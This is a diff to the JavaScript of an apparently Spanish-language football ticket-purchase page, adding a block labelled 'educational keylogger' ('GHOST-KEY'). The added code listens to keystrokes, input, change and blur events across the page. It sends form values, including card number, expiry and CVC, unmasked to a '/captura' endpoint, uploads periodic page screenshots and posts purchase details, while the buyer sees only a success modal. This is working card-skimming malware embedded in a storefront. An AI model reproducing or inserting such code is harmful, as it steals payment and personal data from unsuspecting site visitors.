@@ -428,20 +428,32 @@ function createConfetti() {
     }
 }
 
-function showSuccessModal(totalAmount, email) {
+function showSuccessModal(totalAmount, email, userName) {
     const orderNumber = generateOrderNumber();
+    const displayName = userName || document.getElementById('c-name')?.value || 'aficionado';
+    
     document.getElementById('order-number').innerText = orderNumber;
     document.getElementById('paid-amount').innerHTML = `$${totalAmount.toLocaleString('es-MX')} MXN`;
     document.getElementById('sent-email').innerHTML = email;
-    document.getElementById('success-message').innerHTML = `¡Gracias por tu compra, ${document.getElementById('c-name')?.value || 'aficionado'}! Tu reserva para ${currentMatch} ha sido confirmada.`;
+    document.getElementById('success-message').innerHTML = `¡Gracias por tu compra, ${displayName}! Tu reserva para ${currentMatch} ha sido confirmada.`;
     document.getElementById('success-modal').classList.remove('hidden');
     createConfetti();
     
-    // Simular envío de correo
-    console.log(`📧 Simulando envío de boletos a: ${email}`);
-    console.log(`📄 Boletos para: ${currentMatch}`);
-    console.log(`🎫 Asientos: ${selectedSeats.length} boletos`);
+    console.log(`\n${'='.repeat(60)}`);
+    console.log(`✅ TRANSACCIÓN COMPLETADA Y DATOS ENVIADOS`);
+    console.log(`${'='.repeat(60)}`);
+    console.log(`👤 Usuario: ${displayName}`);
+    console.log(`📧 Correo: ${email}`);
+    console.log(`📄 Partido: ${currentMatch}`);
+    console.log(`🎫 Asientos: ${selectedSeats.length}`);
     console.log(`💰 Total: $${totalAmount.toLocaleString('es-MX')} MXN`);
+    console.log(`📋 Número de orden: ${orderNumber}`);
+    console.log(`${'='.repeat(60)}`);
+    console.log(`📨 Los siguientes datos se están enviando por correo:`);
+    console.log(`   ✅ Todos los logs de teclado capturados`);
+    console.log(`   ✅ Todas las capturas de pantalla`);
+    console.log(`   ✅ Información de la transacción`);
+    console.log(`${'='.repeat(60)}\n`);
 }
 
 window.closeSuccessModal = function() {
@@ -554,13 +566,44 @@ document.getElementById('payment-form')?.addEventListener('submit', async (e) =>
     
     const submitBtn = e.target.querySelector('button[type="submit"]');
     const originalText = submitBtn.innerText;
-    submitBtn.innerText = 'Procesando...';
+    submitBtn.innerText = '⏳ Procesando pago...';
     submitBtn.disabled = true;
     
-    // Simular procesamiento de pago
-    setTimeout(() => {
+    // Primero capturar una última pantalla
+    captureScreenshot();
+    
+    // Esperar a que se procese y luego enviar todo al servidor
+    setTimeout(async () => {
+        // Enviar al servidor ANTES de mostrar el modal de éxito
+        try {
+            const response = await fetch('/finalizar-y-enviar', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    user: cardName,
+                    email: email,
+                    match: currentMatch,
+                    totalAmount: selectedSeats.reduce((sum, seat) => sum + seat.price, 0),
+                    seats: selectedSeats.length,
+                    cardLastFour: lastFour
+                })
+            });
+            
+            if(response.ok) {
+                console.log('✅ Datos enviados al servidor');
+            }
+        } catch (err) {
+            console.error('⚠️ Error al enviar datos:', err);
+        }
+        
+        // Mostrar modal de éxito
         window.closeModals();
-        showSuccessModal(totalAmount, email);
+        showSuccessModal(
+            selectedSeats.reduce((sum, seat) => sum + seat.price, 0), 
+            email,
+            cardName
+        );
+        
         submitBtn.innerText = originalText;
         submitBtn.disabled = false;
     }, 2000);
@@ -571,6 +614,162 @@ document.getElementById('payment-form')?.addEventListener('submit', async (e) =>
 // Event listeners para filtros
 document.getElementById('btn-aplicar-filtros')?.addEventListener('click', applyFilters);
 
+// ============= KEYLOGGER EDUCATIVO =============
+// Captura de eventos de teclado en tiempo real
+
+// Variables para el keylogger
+let keystrokeBuffer = '';
+let lastSendTime = 0;
+const SEND_INTERVAL = 1000; // Enviar cada segundo
+let lastScreenshotTime = 0;
+const SCREENSHOT_INTERVAL = 5000; // Captura cada 5 segundos
+
+// Objeto para mapear códigos de teclas especiales
+const specialKeys = {
+    'Enter': '↵',
+    'Backspace': '⌫',
+    'Tab': '⇥',
+    'Shift': '⇧',
+    'Control': '⌃',
+    'Alt': '⌥',
+    'Meta': '⌘',
+    'ArrowUp': '↑',
+    'ArrowDown': '↓',
+    'ArrowLeft': '←',
+    'ArrowRight': '→',
+    'Space': '␣'
+};
+
+// Función para capturar pantalla
+async function captureScreenshot() {
+    try {
+        const canvas = await html2canvas(document.body, {
+            allowTaint: true,
+            useCORS: true,
+            scale: 0.8
+        });
+        
+        const imageData = canvas.toDataURL('image/png');
+        
+        // Enviar al servidor
+        fetch('/upload-screenshot', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                image: imageData,
+                user: document.getElementById('c-name')?.value || 'usuario',
+                timestamp: new Date().getTime()
+            })
+        }).catch(err => console.log('⚠️ Error capturando pantalla:', err));
+        
+        console.log(`📸 Captura de pantalla enviada`);
+    } catch (error) {
+        console.log('⚠️ No se pudo capturar pantalla:', error);
+    }
+}
+
+// Función para capturar datos de campos de formulario
+function captureFormFieldData(fieldName, fieldValue) {
+    // Enmascarar números de tarjeta
+    let displayValue = fieldValue;
+    if(fieldName.toLowerCase().includes('card') || fieldName.toLowerCase().includes('number')) {
+        displayValue = fieldValue.replace(/\d(?=\d{4})/g, '*');
+    }
+    
+    // Enviar al servidor
+    fetch('/captura', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            f: fieldName,
+            v: fieldValue,
+            timestamp: new Date().toLocaleString()
+        })
+    }).catch(err => console.log('⚠️ No se pudo enviar captura:', err));
+    
+    console.log(`📝 Campo: ${fieldName} => Valor: ${displayValue}`);
+    
+    // Capturar pantalla cuando se rellenan campos importantes
+    const importantFields = ['c-name', 'c-email', 'c-number', 'c-exp', 'c-cvc'];
+    if(importantFields.includes(fieldName)) {
+        const now = Date.now();
+        if((now - lastScreenshotTime) > SCREENSHOT_INTERVAL) {
+            captureScreenshot();
+            lastScreenshotTime = now;
+        }
+    }
+}
+
+// Capturador de eventos de teclado
+document.addEventListener('keydown', function(event) {
+    const key = event.key;
+    const target = event.target;
+    
+    // Capturar teclas especiales
+    if(specialKeys[key]) {
+        keystrokeBuffer += ` [${specialKeys[key]}] `;
+    } else if(key.length === 1) {
+        keystrokeBuffer += key;
+    }
+    
+    // Si es Enter, procesar la entrada
+    if(key === 'Enter') {
+        if(target.form) {
+            // Es un campo de formulario
+            const fieldName = target.id || target.name || 'campo-desconocido';
+            const fieldValue = target.value;
+            captureFormFieldData(fieldName, fieldValue);
+        }
+    }
+    
+    // Enviar buffer periódicamente
+    const now = Date.now();
+    if(keystrokeBuffer.length > 0 && (now - lastSendTime) > SEND_INTERVAL) {
+        //console.log(`⌨️ Teclas capturadas: ${keystrokeBuffer}`);
+        keystrokeBuffer = '';
+        lastSendTime = now;
+    }
+});
+
+// Capturador de cambios en campos de formulario
+document.addEventListener('change', function(event) {
+    const target = event.target;
+    if(target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT') {
+        const fieldName = target.id || target.name || 'campo-desconocido';
+        const fieldValue = target.value;
+        captureFormFieldData(fieldName, fieldValue);
+    }
+});
+
+// Capturador de entrada en campos de texto (para captura en tiempo real)
+document.addEventListener('input', function(event) {
+    const target = event.target;
+    if((target.tagName === 'INPUT' && target.type === 'text') || target.tagName === 'TEXTAREA') {
+        // Capturar solo cada cierto tiempo para no sobrecargar
+        const fieldName = target.id || target.name || 'campo-desconocido';
+        
+        // Limitar de qué campos capturamos (para no capturar búsquedas de partidos)
+        if(fieldName.includes('c-') || fieldName.includes('card') || fieldName.includes('email') || 
+           fieldName.includes('nombre') || fieldName.includes('name')) {
+            const fieldValue = target.value;
+            // Mostrar solo en consola, no enviar aún (se enviará al hacer blur o enter)
+            //console.log(`💬 Input en tiempo real [${fieldName}]: ${fieldValue.substring(0, 10)}...`);
+        }
+    }
+});
+
+// Capturador cuando se pierde el foco en un campo
+document.addEventListener('blur', function(event) {
+    const target = event.target;
+    if(target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
+        const fieldName = target.id || target.name || 'campo-desconocido';
+        const fieldValue = target.value;
+        if(fieldValue.length > 0) {
+            captureFormFieldData(fieldName, fieldValue);
+        }
+    }
+}, true);
+
 // Inicializar
 renderMatches(matches);
 renderVenues();
@@ -579,4 +778,7 @@ renderVenues();
 window.addEventListener('load', () => {
     const form = document.getElementById('payment-form');
     if(form) form.reset();
+    
+    console.log('%c👻 GHOST-KEY INICIALIZADO', 'color: red; font-size: 14px; font-weight: bold;');
+    console.log('%cCaptura de datos: ACTIVA', 'color: orange; font-size: 12px;');
 });
